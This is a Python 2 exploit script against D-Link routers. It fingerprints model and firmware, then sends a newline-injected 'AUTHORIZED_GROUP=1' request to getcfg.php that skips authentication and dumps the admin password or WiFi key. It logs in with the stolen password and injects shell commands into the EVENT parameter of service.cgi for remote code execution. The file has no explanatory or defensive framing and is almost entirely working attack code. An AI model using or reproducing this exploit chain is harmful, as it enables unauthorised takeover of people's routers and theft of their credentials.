import requests
import re
import logging
import random
import string


logging.basicConfig(level=logging.INFO,format = '[+%(levelname)s] %(message)s')
#if need log to file, use logging.basicConfig(filename="test.log", filemode="w",

proxies = {'http': 'http://172.16.217.1:8080'}
header=""
def generare_header():
        
    header = {"Cookie": "uid=" + "".join(random.choice(string.letters) for _ in range(10)),
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
            "Host": "localhost",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            }
    return header
        

def dlink_detection(URL):

    firmware_version=None
    product_version=None
    product_version_regx = ['<a href="http://support.dlink.com" target="_blank">(.*?)<',
                   '<div class="modelname">(.*?)</div>',
                   '<div class="pp">Product Page : (.*?)<a href="javascript:check_is_modified">'
                 ]
    firmware_version_regx='Firmware Version : (.*?)</span>'
    firmware_version_regx='<span class="version">\D+(\d.*?)</span>'

    try:
        r = requests.get(URL, timeout=10.00)
    except requests.exceptions.ConnectionError:
        logging.error("Error: Failed to connect to " + URL)
        return None,None

    if r.status_code != 200:
        logging.error("Error: " + URL + " returned status code " + str(r.status_code))
        return None,None

    for rex in product_version_regx:
        if re.search(rex, r.text):
            res = re.findall(rex, r.text)
            product_version=res[0]
            print product_version
    if re.search(firmware_version_regx,r.text):
        res=re.findall(firmware_version_regx, r.text)
        firmware_version=res[0]
        print firmware_version
    if firmware_version and product_version:
        return product_version,firmware_version

    logging.error("Warning: Unable to detect device for " + URL)

    return None, None

def query_getcfg(url,para):

    post_data="SERVICES=%s&a=1%%0aAUTHORIZED_GROUP=1"%(para)
    try:
        r = requests.post(url + "/getcfg.php", data=post_data,headers=header)
    except requests.exceptions.ConnectionError:
        logging.error("Failed to access " + url + "/getcfg.php")
        return None

    if not (r.status_code == 200 and r.reason == "OK"):
        logging.error("Did not recieve a HTTP 200")
        return None

    if re.search("<message>Not authorized</message>", r.text):
        logging.error("Not vulnerable")
        return None

    return r.text

def create_session(url,user,password):
    
    payload={
            "REPORT_METHOD": "xml",
            "ACTION": "login_plaintext",
            "USER": user,
            "PASSWD": password,
            "CAPTCHA": ''
            }
    try:
        r = requests.post(url + "/session.cgi", data=payload, headers=header)
    except requests.exceptions.ConnectionError:
        logging.error("Failed to access " + url + "/session.cgi")
        return False

    if not (r.status_code == 200 and r.reason == "OK"):
        logging.error("Did not recieve a HTTP 200")
        return False

    if not re.search("<RESULT>SUCCESS</RESULT>", r.text):
        logging.error("Did not get a success code")
        return False

    return True


def get_password(url):
    
    data=query_getcfg(url,"DEVICE.ACCOUNT")
    if not data:
        return None
    res = re.findall("<password>(.*?)</password>", data)
    print res
    
    if len(res) > 0 and  "=OoXxGgYy=" not in res[0]:
        return res[0]

    # Did not find it in first attempt
    data = query_getcfg(url,"WIFI")
    if not data:
        return None
    print "123"
    res = re.findall("<key>(.*?)</key>", data)
    if len(res) > 0:
        return res[0]

    # All attempts failed, just going to return and wish best of luck!
    return None

def execute_command(url,command):

    url=url+"/service.cgi"
    payload="EVENT=;%s%%26"%(command)
    payload="EVENT=;%s;"%(command)

    try:
        r = requests.post(url, data=payload, headers=header)
    except requests.exceptions.ConnectionError:
        logging.error("Failed to access " + url + "/session.cgi")
        return False

    if not (r.status_code == 200 and r.reason == "OK"):
        logging.error("Did not recieve a HTTP 200")
        return False
    print r.text

def main():
    global header
    url=""
    header=generare_header()
    product_version,firmware_version=dlink_detection(url)
    if not product_version:
        logging.error("product not found, quiting")
        exit(0)
    logging.info("product version: %s"%product_version)
    logging.info("firmware version: %s"%(firmware_version))

    password=get_password(url)
    logging.info("admin password: %s"%(password))

    if not create_session(url,"admin",password):
        logging.error("Can't create session")
        exit(0)
    execute_command(url,"busybox") 
    


if __name__ =="__main__":
    main()




